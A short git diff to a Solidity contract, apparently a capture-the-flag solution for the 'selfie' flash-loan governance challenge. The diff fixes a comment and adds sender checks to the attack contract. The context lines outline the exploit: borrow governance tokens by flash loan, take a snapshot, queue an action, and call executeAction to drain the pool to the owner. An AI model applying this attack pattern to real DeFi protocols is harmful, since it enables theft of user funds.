@@ -37,7 +37,7 @@ contract SelfieHack is IERC3156FlashBorrower {
             maxAmount,
             ""
         );
-        // selfiePool will call `onFlashLoan()`s
+        // selfiePool will call `onFlashLoan()`
     }
 
     function onFlashLoan(
@@ -47,6 +47,7 @@ contract SelfieHack is IERC3156FlashBorrower {
         uint256 _fee,
         bytes calldata _data
     ) external returns (bytes32) {
+        require(msg.sender == address(selfiePool), "Only Pool");
         //get snapshot to secure our current large balance in token memory
         token.snapshot();
 
@@ -68,6 +69,8 @@ contract SelfieHack is IERC3156FlashBorrower {
     }
 
     function drainFunds() external {
+        require(owner == msg.sender, "Only Owner");
+
         //calls to execute the drain function to owner address
         governancePool.executeAction(actionID);
     }
